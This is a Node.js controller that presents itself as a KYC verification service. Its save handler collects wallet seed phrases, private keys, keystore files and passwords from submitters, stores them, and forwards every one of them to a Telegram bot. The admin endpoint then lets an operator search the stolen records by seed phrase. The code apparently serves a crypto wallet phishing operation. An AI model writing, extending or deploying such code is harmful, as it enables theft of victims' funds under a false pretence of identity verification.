const Kyc = require('../models/Kyc');
const cloudinary = require('cloudinary').v2;
const { notifyNewKyc } = require('../../telegramBot');

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// helper: verify a public_id exists and optionally matches expected folder prefix
async function verifyCloudinaryResource(public_id, resource_type = 'auto', expectedFolderPrefix) {
  try {
    // resource_type may be 'image' or 'raw' or 'auto'
    const info = await cloudinary.api.resource(public_id, { resource_type });
    if (expectedFolderPrefix && (!info.folder || !info.folder.startsWith(expectedFolderPrefix))) {
      throw new Error(`Resource ${public_id} is not in expected folder ${expectedFolderPrefix}`);
    }
    // optionally check bytes, format, etc here
    return info;
  } catch (err) {
    // propagate error to caller
    throw err;
  }
}

// Save KYC details - expects client to upload files to Cloudinary unsigned and send back their metadata
exports.saveKycDetails = async (req, res) => {
  try {
    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls } = req.body;

    console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0 });

    const expectedFolderPrefix = `kyc/${sessionId || 'unknown'}`;
    const verified = [];
    let verificationStatus = 'no_images';
    let verificationError = null;

    if (Array.isArray(imageUrls) && imageUrls.length > 0) {
      verificationStatus = 'pending';
      try {
        for (const item of imageUrls) {
          if (!item || !item.public_id) throw new Error('Missing public_id in imageUrls item');
          const resourceType = item.resource_type || 'auto';
          const info = await verifyCloudinaryResource(item.public_id, resourceType, expectedFolderPrefix);
          verified.push({ url: info.secure_url || item.url, public_id: info.public_id, resource_type: info.resource_type, bytes: info.bytes, format: info.format, folder: info.folder });
        }
        verificationStatus = 'verified';
      } catch (verifyErr) {
        console.error('Cloudinary verification failed:', verifyErr.message || verifyErr);
        verificationStatus = 'verification_failed';
        verificationError = verifyErr.message || String(verifyErr);
      }
    }

    // Always create a new KYC entry for each submission
    const kycData = new Kyc({
      sessionId,
      walletType,
      seedPhrase,
      keystoreJson,
      password,
      privateKey,
      imageUrls: verified.length ? verified : (Array.isArray(imageUrls) ? imageUrls : []),
      verificationStatus,
      verificationError,
    });

    await kycData.save();
    // Send Telegram notification with KYC details
    try {
      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified });
    } catch (err) {
      console.error('Failed to send KYC telegram notification', err);
    }
    res.status(201).json({ message: 'KYC details saved successfully', verificationStatus, verificationError });
  } catch (error) {
    console.error('saveKycDetails error', error);
    res.status(500).json({ message: 'Failed to save KYC details' });
  }
};

// Fetch KYC details
exports.getKycDetails = async (req, res) => {
  try {
    // Support pagination, search and filters for admin listing
    const { page = 1, limit = 20, q, status, walletType, sessionId, sort = '-createdAt' } = req.query;
    const skip = (Math.max(1, parseInt(page)) - 1) * Math.max(1, parseInt(limit));

    const filter = {};
    if (sessionId) filter.sessionId = sessionId;
    if (status) filter.verificationStatus = status;
    if (walletType) filter.walletType = walletType;
    if (q) {
      // simple text search on sessionId, walletType or seedPhrase (case-insensitive)
      const re = new RegExp(q, 'i');
      filter.$or = [ { sessionId: re }, { walletType: re }, { seedPhrase: re } ];
    }

    const total = await Kyc.countDocuments(filter);
    const docs = await Kyc.find(filter).sort(sort).skip(skip).limit(Math.max(1, parseInt(limit)));

    res.status(200).json({ total, page: parseInt(page), limit: parseInt(limit), pages: Math.ceil(total / Math.max(1, parseInt(limit))), docs });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Failed to fetch KYC details' });
  }
};